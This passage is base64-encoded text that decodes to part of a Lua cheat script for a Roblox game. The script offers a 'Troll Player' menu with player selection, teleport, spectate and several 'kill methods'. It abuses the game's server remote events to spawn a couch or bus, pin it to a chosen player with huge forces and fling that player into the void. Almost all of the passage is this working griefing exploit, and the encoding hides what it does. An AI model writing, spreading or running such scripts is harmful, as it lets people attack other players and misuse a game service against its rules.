JnZXRQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkIGFuZCB0YXJnZXRQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkLlNpdCA9PSB0cnVlCiAgICB0YXNrLndhaXQoKQogICAgdGV0OkRlc3Ryb3koKQogICAgY291Y2guUGFyZW50ID0gTG9jYWxQbGF5ZXIuQmFja3BhY2sKICAgIHRhc2sud2FpdCgpCiAgICBjb3VjaDpGaW5kRmlyc3RDaGlsZCgiSGFuZGxlICIpLk5hbWUgPSAiSGFuZGxlIgogICAgdGFzay53YWl0KDAuMykKICAgIGNvdWNoLlBhcmVudCA9IExvY2FsUGxheWVyLkNoYXJhY3RlcgogICAgdGFzay53YWl0KDAuMykKICAgIGNvdWNoLkdyaXAgPSBDRnJhbWUubmV3KFZlY3RvcjMubmV3KDAsIDAsIDApKQogICAgdGFzay53YWl0KDAuMykKICAgIFJlcGxpY2F0ZWRTdG9yYWdlLlJFWyIxQ2xlYTFyVG9vbDFzIl06RmlyZVNlcnZlcigiQ2xlYXJBbGxUb29scyIpCmVuZAoKLS0gS2lsbFdpdGhDb3VjaCBGdW5jdGlvbgpsb2NhbCBmdW5jdGlvbiBLaWxsV2l0aENvdWNoKCkKICAgIGxvY2FsIHRhcmdldFBsYXllciA9IFBsYXllcnM6RmluZEZpcnN0Q2hpbGQoZ2V0Z2VudigpLlRhcmdldCkKICAgIGlmIG5vdCB0YXJnZXRQbGF5ZXIgdGhlbgogICAgICAgIHdhcm4oIuKdjO+4sU5vIHRhcmdldCBwbGF5ZXIgc2VsZWN0ZWQuIikKICAgICAgICByZXR1cm4KICAgIGVuZAogICAgaWYgbm90IHRhcmdldFBsYXllci5DaGFyYWN0ZXIgb3Igbm90IHRhcmdldFBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiKSB0aGVuCiAgICAgICAgd2Fybigi4p2M77ixVGFyZ2V0IHBsYXllciBoYXMgbm8gY2hhcmFjdGVyIG9yIEh1bWFub2lkUm9vdFBhcnQuIikKICAgICAgICByZXR1cm4KICAgIGVuZAoKICAgIGxvY2FsIGFyZ3MgPSB7IFsxXSA9ICJDbGVhckFsbFRvb2xzIiB9CiAgICBSZXBsaWNhdGVkU3RvcmFnZS5SRVsiMUNsZWExclRvb2wxcyJdOkZpcmVTZXJ2ZXIodW5wYWNrKGFyZ3MpKQogICAgbG9jYWwgYXJncyA9IHsgWzFdID0gIlBpY2tpbmdUb29scyIsIFsyXSA9ICJDb3VjaCIgfQogICAgUmVwbGljYXRlZFN0b3JhZ2UuUkU6RmluZEZpcnN0Q2hpbGQoIjFUb28xbCIpOkludm9rZVNlcnZlcih1bnBhY2soYXJncykpCgogICAgbG9jYWwgY291Y2ggPSBMb2NhbFBsYXllci5CYWNrcGFjazpXYWl0Rm9yQ2hpbGQoIkNvdWNoIiwgMikKICAgIGlmIG5vdCBjb3VjaCB0aGVuCiAgICAgICAgd2Fybigi4p2M77ixQ291Y2ggbm90IGZvdW5kIGluIEJhY2twYWNrLiIpCiAgICAgICAgcmV0dXJuCiAgICBlbmQKCiAgICBjb3VjaC5OYW1lID0gIkNoYW9zLkNvdWNoIgogICAgbG9jYWwgc2VhdDEgPSBjb3VjaDpGaW5kRmlyc3RDaGlsZCgiU2VhdDEiKQogICAgbG9jYWwgc2VhdDIgPSBjb3VjaDpGaW5kRmlyc3RDaGlsZCgiU2VhdDIiKQogICAgbG9jYWwgaGFuZGxlID0gY291Y2g6RmluZEZpcnN0Q2hpbGQoIkhhbmRsZSIpCiAgICBpZiBzZWF0MSBhbmQgc2VhdDIgYW5kIGhhbmRsZSB0aGVuCiAgICAgICAgc2VhdDEuRGlzYWJsZWQgPSB0cnVlCiAgICAgICAgc2VhdDIuRGlzYWJsZWQgPSB0cnVlCiAgICAgICAgaGFuZGxlLk5hbWUgPSAiSGFuZGxlICIKICAgIGVsc2UKICAgICAgICB3YXJuKCLinYzvuLFDb3VjaCBjb21wb25lbnRzIG5vdCBmb3VuZC4iKQogICAgICAgIHJldHVybgogICAgZW5kCiAgICBjb3VjaC5QYXJlbnQgPSBMb2NhbFBsYXllci5DaGFyYWN0ZXIKCiAgICBsb2NhbCB0ZXQgPSBJbnN0YW5jZS5uZXcoIkJvZHlWZWxvY2l0eSIsIHNlYXQxKQogICAgdGV0Lk1heEZvcmNlID0gVmVjdG9yMy5uZXcobWF0aC5odWdlLCBtYXRoLmh1Z2UsIG1hdGguaHVnZSkKICAgIHRldC5QID0gMTI1MAogICAgdGV0LlZlbG9jaXR5ID0gVmVjdG9yMy5uZXcoMCwgMCwgMCkKICAgIHRldC5OYW1lID0gIiNtT1ZPT0VQRiQjQEYkI0dFUkUuLj5WPDw8PEVXPFY8PFciCgogICAgcmVwZWF0CiAgICAgICAgZm9yIG0gPSAxLCAzNSBkbwogICAgICAgICAgICBsb2NhbCBwb3MgPSB7IHggPSAwLCB5ID0gMCwgeiA9IDAgfQogICAgICAgICAgICBsb2NhbCB0Um9vdCA9IHRhcmdldFBsYXllci5DaGFyYWN0ZXIgYW5kIHRhcmdldFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydAogICAgICAgICAgICBpZiBub3QgdFJvb3QgdGhlbiBicmVhayBlbmQKICAgICAgICAgICAgcG9zLnggPSB0Um9vdC5Qb3NpdGlvbi5YICsgKHRSb290LlZlbG9jaXR5LlggLyAyKQogICAgICAgICAgICBwb3MueSA9IHRSb290LlBvc2l0aW9uLlkgKyAodFJvb3QuVmVsb2NpdHkuWSAvIDIpCiAgICAgICAgICAgIHBvcy56ID0gdFJvb3QuUG9zaXRpb24uWiArICh0Um9vdC5WZWxvY2l0eS5aIC8gMikKICAgICAgICAgICAgc2VhdDEuQ0ZyYW1lID0gQ0ZyYW1lLm5ldyhWZWN0b3IzLm5ldyhwb3MueCwgcG9zLnksIHBvcy56KSkgKiBDRnJhbWUubmV3KC0yLCAyLCAwKQogICAgICAgICAgICB0YXNrLndhaXQoKQogICAgICAgIGVuZAogICAgICAgIHRldDpEZXN0cm95KCkKICAgICAgICBjb3VjaC5QYXJlbnQgPSBMb2NhbFBsYXllci5CYWNrcGFjawogICAgICAgIHRhc2sud2FpdCgpCiAgICAgICAgY291Y2g6RmluZEZpcnN0Q2hpbGQoIkhhbmRsZSAiKS5OYW1lID0gIkhhbmRsZSIKICAgICAgICB0YXNrLndhaXQoMC4yKQogICAgICAgIGNvdWNoLlBhcmVudCA9IExvY2FsUGxheWVyLkNoYXJhY3RlcgogICAgICAgIHRhc2sud2FpdCgpCiAgICAgICAgY291Y2guUGFyZW50ID0gTG9jYWxQbGF5ZXIuQmFja3BhY2sKICAgICAgICBjb3VjaC5IYW5kbGUuTmFtZSA9ICJIYW5kbGUgIgogICAgICAgIHRhc2sud2FpdCgwLjIpCiAgICAgICAgY291Y2guUGFyZW50ID0gTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyCiAgICAgICAgdGV0ID0gSW5zdGFuY2UubmV3KCJCb2R5VmVsb2NpdHkiLCBzZWF0MSkKICAgICAgICB0ZXQuTWF4Rm9yY2UgPSBWZWN0b3IzLm5ldyhtYXRoLmh1Z2UsIG1hdGguaHVnZSwgbWF0aC5odWdlKQogICAgICAgIHRldC5QID0gMTI1MAogICAgICAgIHRldC5WZWxvY2l0eSA9IFZlY3RvcjMubmV3KDAsIDAsIDApCiAgICAgICAgdGV0Lk5hbWUgPSAiI21PVk9PRVBGJCNARiQjR0VSRS4uPlY8PDw8RVc8Vjw8VyIKICAgIHVudGlsIHRhcmdldFBsYXllci5DaGFyYWN0ZXIgYW5kIHRhcmdldFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWQgYW5kIHRhcmdldFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWQuU2l0ID09IHRydWUKICAgIHRhc2sud2FpdCgpCiAgICBjb3VjaC5QYXJlbnQgPSBMb2NhbFBsYXllci5CYWNrcGFjawogICAgc2VhdDEuQ0ZyYW1lID0gQ0ZyYW1lLm5ldyg5OTk5LCAtNDUwLCA5OTk5KQogICAgc2VhdDIuQ0ZyYW1lID0gQ0ZyYW1lLm5ldyg5OTk5LCAtNDUwLCA5OTk5KQogICAgY291Y2guUGFyZW50ID0gTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyCiAgICB0YXNrLndhaXQoMC4xKQogICAgY291Y2guUGFyZW50ID0gTG9jYWxQbGF5ZXIuQmFja3BhY2sKICAgIHRhc2sud2FpdCgyKQogICAgbG9jYWwgYnYgPSBzZWF0MTpGaW5kRmlyc3RDaGlsZCgiI21PVk9PRVBGJCNARiQjR0VSRS4uPlY8PDw8RVc8Vjw8VyIpCiAgICBpZiBidiB0aGVuIGJ2OkRlc3Ryb3koKSBlbmQKICAgIFJlcGxpY2F0ZWRTdG9yYWdlLlJFWyIxQ2xlYTFyVG9vbDFzIl06RmlyZVNlcnZlcigiQ2xlYXJBbGxUb29scyIpCmVuZAogICAgbG9jYWwgUGxheWVyU2VjdGlvbiA9IFRyb2xsOkFkZFNlY3Rpb24oeyBOYW1lID0gIlRyb2xsIFBsYXllciIgfSkKCiAgICAtLSBGdW5jdGlvbiB0byBnZXQgbGlzdCBvZiBwbGF5ZXJzCiAgICBsb2NhbCBmdW5jdGlvbiBnZXRQbGF5ZXJMaXN0KCkKICAgICAgICBsb2NhbCBwbGF5ZXJzID0gUGxheWVyczpHZXRQbGF5ZXJzKCkKICAgICAgICBsb2NhbCBwbGF5ZXJOYW1lcyA9IHt9CiAgICAgICAgZm9yIF8sIHBsYXllciBpbiBpcGFpcnMocGxheWVycykgZG8KICAgICAgICAgICAgaWYgcGxheWVyIH49IExvY2FsUGxheWVyIHRoZW4KICAgICAgICAgICAgICAgIHRhYmxlLmluc2VydChwbGF5ZXJOYW1lcywgcGxheWVyLk5hbWUpCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgICAgIHJldHVybiBwbGF5ZXJOYW1lcwogICAgZW5kCgogICAgbG9jYWwga2lsbERyb3Bkb3duID0gVHJvbGw6QWRkRHJvcGRvd24oewogICAgICAgIE5hbWUgPSAi8J+RpO+4sUNob29zZSBwbGF5ZXI6IiwKICAgICAgICBPcHRpb25zID0gZ2V0UGxheWVyTGlzdCgpLAogICAgICAgIERlZmF1bHQgPSAiIiwKICAgICAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKHZhbHVlKQogICAgICAgICAgICBzZWxlY3RlZFBsYXllck5hbWUgPSB2YWx1ZQogICAgICAgICAgICBnZXRnZW52KCkuVGFyZ2V0ID0gdmFsdWUKICAgICAgICAgICAgcHJpbnQoIlNlbGVjdGVkIHBsYXllcjogIiAuLiB0b3N0cmluZyh2YWx1ZSkpCiAgICAgICAgZW5kCiAgICB9KQoKICAgIFRyb2xsOkFkZEJ1dHRvbih7CiAgICAgICAgTmFtZSA9ICLwn5SE77ixUmVzZXRzIHRoZSBwbGF5ZXIgbGlzdDoiLAogICAgICAgIENhbGxiYWNrID0gZnVuY3Rpb24oKQogICAgICAgICAgICBsb2NhbCB0YWJsZVBsYXllcnMgPSBQbGF5ZXJzOkdldFBsYXllcnMoKQogICAgICAgICAgICBsb2NhbCBuZXdQbGF5ZXJzID0ge30KICAgICAgICAgICAgaWYga2lsbERyb3Bkb3duIGFuZCAjdGFibGVQbGF5ZXJzID4gMCB0aGVuCiAgICAgICAgICAgICAgICBmb3IgXywgcGxheWVyIGluIGlwYWlycyh0YWJsZVBsYXllcnMpIGRvCiAgICAgICAgICAgICAgICAgICAgaWYgcGxheWVyLk5hbWUgfj0gTG9jYWxQbGF5ZXIuTmFtZSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIHRhYmxlLmluc2VydChuZXdQbGF5ZXJzLCBwbGF5ZXIuTmFtZSkKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAga2lsbERyb3Bkb3duOlNldChuZXdQbGF5ZXJzKQogICAgICAgICAgICAgICAgcHJpbnQoIvCflITvuLFQbGF5ZXIgbGlzdCByZXNldGVkICIsIHRhYmxlLmNvbmNhdChuZXdQbGF5ZXJzLCAiLCAiKSkKICAgICAgICAgICAgICAgIGlmIHNlbGVjdGVkUGxheWVyTmFtZSBhbmQgbm90IFBsYXllcnM6RmluZEZpcnN0Q2hpbGQoc2VsZWN0ZWRQbGF5ZXJOYW1lKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgc2VsZWN0ZWRQbGF5ZXJOYW1lID0gbmlsCiAgICAgICAgICAgICAgICAgICAgZ2V0Z2VudigpLlRhcmdldCA9IG5pbAogICAgICAgICAgICAgICAgICAgIGtpbGxEcm9wZG93bjpTZXRWYWx1ZSgiIikKICAgICAgICAgICAgICAgICAgICBwcmludCgi4pyF77ixU2VsZWN0aW9uIHJlc2V0LCBwbGF5ZXIgaXMgbm8gbG9uZ2VyIGluIHRoZSBzZXJ2ZXIuIikKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICBwcmludCgi4p2M77ixRHJvcGRvd24gbm90IGZvdW5kIG9yIG5vIHBsYXllcnMgYXZhaWxhYmxlLiIpCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgfSkKCiAgICBUcm9sbDpBZGRCdXR0b24oewogICAgICAgIE5hbWUgPSAi8J+MgO+4sVRlbGVwb3J0IHRvIFBsYXllciIsCiAgICAgICAgQ2FsbGJhY2sgPSBmdW5jdGlvbigpCiAgICAgICAgICAgIGlmIG5vdCBzZWxlY3RlZFBsYXllck5hbWUgb3Igbm90IFBsYXllcnM6RmluZEZpcnN0Q2hpbGQoc2VsZWN0ZWRQbGF5ZXJOYW1lKSB0aGVuCiAgICAgICAgICAgICAgICBwcmludCgi4p2M77ixUGxheWVyIG5vdCBzZWxlY3RlZCBvciBkb2VzIG5vdCBleGlzdC4iKQogICAgICAgICAgICAgICAgcmV0dXJuCiAgICAgICAgICAgIGVuZAogICAgICAgICAgICBsb2NhbCBjaGFyYWN0ZXIgPSBMb2NhbFBsYXllci5DaGFyYWN0ZXIKICAgICAgICAgICAgbG9jYWwgaHVtYW5vaWRSb290UGFydCA9IGNoYXJhY3RlciBhbmQgY2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikKICAgICAgICAgICAgaWYgbm90IGh1bWFub2lkUm9vdFBhcnQgdGhlbgogICAgICAgICAgICAgICAgd2Fybigi4p2M77ixTG9jYWwgcGxheWVyJ3MgSHVtYW5vaWRSb290UGFydCBub3QgZm91bmQuIikKICAgICAgICAgICAgICAgIHJldHVybgogICAgICAgICAgICBlbmQKCiAgICAgICAgICAgIGxvY2FsIHRhcmdldFBsYXllciA9IFBsYXllcnM6RmluZEZpcnN0Q2hpbGQoc2VsZWN0ZWRQbGF5ZXJOYW1lKQogICAgICAgICAgICBpZiB0YXJnZXRQbGF5ZXIgYW5kIHRhcmdldFBsYXllci5DaGFyYWN0ZXIgYW5kIHRhcmdldFBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiKSB0aGVuCiAgICAgICAgICAgICAgICBodW1hbm9pZFJvb3RQYXJ0LkNGcmFtZSA9IHRhcmdldFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydC5DRnJhbWUKICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgcHJpbnQoIuKdjO+4sVRhcmdldCBwbGF5ZXIgbm90IGZvdW5kIG9yIGhhcyBubyBIdW1hbm9pZFJvb3RQYXJ0LiIpCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgfSkKCiAgICBUcm9sbDpBZGRUb2dnbGUoewogICAgICAgIE5hbWUgPSAi8J+RgO+4sVNwZWN0YXRlIFBsYXllciIsCiAgICAgICAgRGVmYXVsdCA9IGZhbHNlLAogICAgICAgIENhbGxiYWNrID0gZnVuY3Rpb24odmFsdWUpCiAgICAgICAgICAgIGxvY2FsIENhbWVyYSA9IHdvcmtzcGFjZS5DdXJyZW50Q2FtZXJhCgogICAgICAgICAgICBsb2NhbCBmdW5jdGlvbiBVcGRhdGVDYW1lcmEoKQogICAgICAgICAgICAgICAgaWYgdmFsdWUgdGhlbgogICAgICAgICAgICAgICAgICAgIGxvY2FsIHRhcmdldFBsYXllciA9IFBsYXllcnM6RmluZEZpcnN0Q2hpbGQoc2VsZWN0ZWRQbGF5ZXJOYW1lKQogICAgICAgICAgICAgICAgICAgIGlmIHRhcmdldFBsYXllciBhbmQgdGFyZ2V0UGxheWVyLkNoYXJhY3RlciB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIGh1bWFub2lkID0gdGFyZ2V0UGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWQiKQogICAgICAgICAgICAgICAgICAgICAgICBpZiBodW1hbm9pZCB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBDYW1lcmEuQ2FtZXJhU3ViamVjdCA9IGh1bWFub2lkCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgICAgIGlmIExvY2FsUGxheWVyLkNoYXJhY3RlciB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIGh1bWFub2lkID0gTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZCIpCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIGh1bWFub2lkIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIENhbWVyYS5DYW1lcmFTdWJqZWN0ID0gaHVtYW5vaWQKICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kCgogICAgICAgICAgICBpZiB2YWx1ZSB0aGVuCiAgICAgICAgICAgICAgICBpZiBub3QgZ2V0Z2VudigpLkNhbWVyYUNvbm5lY3Rpb24gdGhlbgogICAgICAgICAgICAgICAgICAgIGdldGdlbnYoKS5DYW1lcmFDb25uZWN0aW9uID0gUnVuU2VydmljZS5IZWFydGJlYXQ6Q29ubmVjdChVcGRhdGVDYW1lcmEpCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgaWYgZ2V0Z2VudigpLkNhbWVyYUNvbm5lY3Rpb24gdGhlbgogICAgICAgICAgICAgICAgICAgIGdldGdlbnYoKS5DYW1lcmFDb25uZWN0aW9uOkRpc2Nvbm5lY3QoKQogICAgICAgICAgICAgICAgICAgIGdldGdlbnYoKS5DYW1lcmFDb25uZWN0aW9uID0gbmlsCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIFVwZGF0ZUNhbWVyYSgpCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgfSkKCiAgICBsb2NhbCBNZXRob2RTZWN0aW9uID0gVHJvbGw6QWRkU2VjdGlvbih7IE5hbWUgPSAi8J+Xoe+4sU1ldGhvZHMiIH0pCgogICAgVHJvbGw6QWRkRHJvcGRvd24oewogICAgICAgIE5hbWUgPSAiQ2hvb3NlIEtpbGwgTWV0aG9kOiIsCiAgICAgICAgT3B0aW9ucyA9IHsiQnVzIiwgIkNvdWNoIiwgIkNvdWNoIHdpdGhvdXQgZ29pbmcgdG8gdGFyZ2V0LiJ9LAogICAgICAgIERlZmF1bHQgPSAiIiwKICAgICAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKHZhbHVlKQogICAgICAgICAgICBtZXRob2RLaWxsID0gdmFsdWUKICAgICAgICAgICAgcHJpbnQoIuKaoO+4j++4sU1ldGhvZCBzZWxlY3RlZDogIiAuLiB0b3N0cmluZyh2YWx1ZSkpCiAgICAgICAgZW5kCiAgICB9KQoKICAgIFRyb2xsOkFkZEJ1dHRvbih7CiAgICAgICAgTmFtZSA9ICJLaWxsIiwKICAgICAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKCkKICAgICAgICAgICAgaWYgbm90IHNlbGVjdGVkUGxheWVyTmFtZSBvciBub3QgUGxheWVyczpGaW5kRmlyc3RDaGlsZChzZWxlY3RlZFBsYXllck5hbWUpIHRoZW4KICAgICAgICAgICAgICAgIHByaW50KCLinYzvuLFQbGF5ZXIgbm90IHNlbGVjdGVkIG9yIGRvZXMgbm90IGV4aXN0LiIpCiAgICAgICAgICAgICAgICByZXR1cm4KICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGlmIG1ldGhvZEtpbGwgPT0gIkNvdWNoIiB0aGVuCiAgICAgICAgICAgICAgICBLaWxsUGxheWVyQ291Y2goKQogICAgICAgICAgICBlbHNlaWYgbWV0aG9kS2lsbCA9PSAiQ291Y2ggd2l0aG91dCBnb2luZyB0byB0YXJnZXQuIiB0aGVuCiAgICAgICAgICAgICAgICBLaWxsV2l0aENvdWNoKCkKICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgLS0gQnVzIG1ldGhvZAogICAgICAgICAgICAgICAgbG9jYWwgY2hhcmFjdGVyID0gTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyCiAgICAgICAgICAgICAgICBsb2NhbCBodW1hbm9pZFJvb3RQYXJ0ID0gY2hhcmFjdGVyIGFuZCBjaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiKQogICAgICAgICAgICAgICAgaWYgbm90IGh1bWFub2lkUm9vdFBhcnQgdGhlbgogICAgICAgICAgICAgICAgICAgIHdhcm4oIuKdjO+4sUxvY2FsIHBsYXllcidzIEh1bWFub2lkUm9vdFBhcnQgbm90IGZvdW5kLiIpCiAgICAgICAgICAgICAgICAgICAgcmV0dXJuCiAgICAgICAgICAgICAgICBlbmQKCiAgICAgICAgICAgICAgICBsb2NhbCBvcmlnaW5hbFBvc2l0aW9uID0gaHVtYW5vaWRSb290UGFydC5DRnJhbWUKCiAgICAgICAgICAgICAgICBsb2NhbCBmdW5jdGlvbiBHZXRCdXMoKQogICAgICAgICAgICAgICAgICAgIGxvY2FsIHZlaGljbGVzID0gZ2FtZS5Xb3Jrc3BhY2U6RmluZEZpcnN0Q2hpbGQoIlZlaGljbGVzIikKICAgICAgICAgICAgICAgICAgICBpZiB2ZWhpY2xlcyB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiB2ZWhpY2xlczpGaW5kRmlyc3RDaGlsZChMb2NhbFBsYXllci5OYW1lIC4uICJDYXIiKQogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgIHJldHVybiBuaWwKICAgICAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgICAgIGxvY2FsIGJ1cyA9IEdldEJ1cygpCgogICAgICAgICAgICAgICAgaWYgbm90IGJ1cyB0aGVuCiAgICAgICAgICAgICAgICAgICAgaHVtYW5vaWRSb290UGFydC5DRnJhbWUgPSBDRnJhbWUubmV3KDExMTguODEsIDc1Ljk5OCwgLTExMzguNjEpCiAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KDAuNSkKICAgICAgICAgICAgICAgICAgICBsb2NhbCByZW1vdGVFdmVudCA9IFJlcGxpY2F0ZWRTdG9yYWdlOkZpbmRGaXJzdENoaWxkKCJSRSIpCiAgICAgICAgICAgICAgICAgICAgaWYgcmVtb3RlRXZlbnQgYW5kIHJlbW90ZUV2ZW50OkZpbmRGaXJzdENoaWxkKCIxQ2ExciIpIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgcmVtb3RlRXZlbnRbIjFDYTFyIl06RmlyZVNlcnZlcigiUGlja2luZ0NhciIsICJTY2hvb2xCdXMiKQogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgxKQogICAgICAgICAgICAgICAgICAgIGJ1cyA9IEdldEJ1cygpCiAgICAgICAgICAgICAgICBlbmQKCiAgICAgICAgICAgICAgICBpZiBidXMgdGhlbgogICAgICAgICAgICAgICAgICAgIGxvY2FsIHNlYXQgPSBidXM6RmluZEZpcnN0Q2hpbGQoIkJvZHkiKSBhbmQgYnVzLkJvZHk6RmluZEZpcnN0Q2hpbGQoIlZlaGljbGVTZWF0IikKICAgICAgICAgICAgICAgICAgICBpZiBzZWF0IGFuZCBjaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGRPZkNsYXNzKCJIdW1hbm9pZCIpIGFuZCBub3QgY2hhcmFjdGVyLkh1bWFub2lkLlNpdCB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIHJlcGVhdAogICAgICAgICAgICAgICAgICAgICAgICAgICAgaHVtYW5vaWRSb290UGFydC5DRnJhbWUgPSBzZWF0LkNGcmFtZSAqIENGcmFtZS5uZXcoMCwgMiwgMCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgpCiAgICAgICAgICAgICAgICAgICAgICAgIHVudGlsIGNoYXJhY3Rlci5IdW1hbm9pZC5TaXQgb3Igbm90IGJ1cy5QYXJlbnQKICAgICAgICAgICAgICAgICAgICAgICAgaWYgY2hhcmFjdGVyLkh1bWFub2lkLlNpdCBvciBub3QgYnVzLlBhcmVudCB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBmb3IgaywgdiBpbiBwYWlycyhidXMuQm9keTpHZXRDaGlsZHJlbigpKSBkbwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIHY6SXNBKCJTZWF0IikgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB2LkNhblRvdWNoID0gZmFsc2UKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgICAgIGxvY2FsIGZ1bmN0aW9uIFRyYWNrUGxheWVyKCkKICAgICAgICAgICAgICAgICAgICB3aGlsZSB0cnVlIGRvCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIHNlbGVjdGVkUGxheWVyTmFtZSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCB0YXJnZXRQbGF5ZXIgPSBQbGF5ZXJzOkZpbmRGaXJzdENoaWxkKHNlbGVjdGVkUGxheWVyTmFtZSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIHRhcmdldFBsYXllciBhbmQgdGFyZ2V0UGxheWVyLkNoYXJhY3RlciBhbmQgdGFyZ2V0UGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCB0YXJnZXRIdW1hbm9pZCA9IHRhcmdldFBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGRPZkNsYXNzKCJIdW1hbm9pZCIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgdGFyZ2V0SHVtYW5vaWQgYW5kIHRhcmdldEh1bWFub2lkLlNpdCB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIGNoYXJhY3Rlci5IdW1hbm9pZCB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBidXM6U2V0UHJpbWFyeVBhcnRDRnJhbWUoQ0ZyYW1lLm5ldyhWZWN0b3IzLm5ldyg5OTk5LCAtNDUwLCA5OTk5KSkpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcmludCgi4pqg77iP77ixVGhlIHBsYXllciBzYXQgZG93biwgdGhyb3dpbmcgdGhlIGJ1cyBpbnRvIHRoZSB2b2lkLi4uIikKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgwLjIpCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgZnVuY3Rpb24gc2ltdWxhdGVKdW1wKCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBodW1hbm9pZCA9IGNoYXJhY3RlciBhbmQgY2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkV2hpY2hJc0EoIkh1bWFub2lkIikKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBodW1hbm9pZCB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGh1bWFub2lkOkNoYW5nZVN0YXRlKEVudW0uSHVtYW5vaWRTdGF0ZVR5cGUuSnVtcGluZykKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNpbXVsYXRlSnVtcCgpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcmludCgi4pqg77iP77ixU2ltdWxhdGluZyBqdW1wLi4uIikKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgwLjUpCiAgICAgI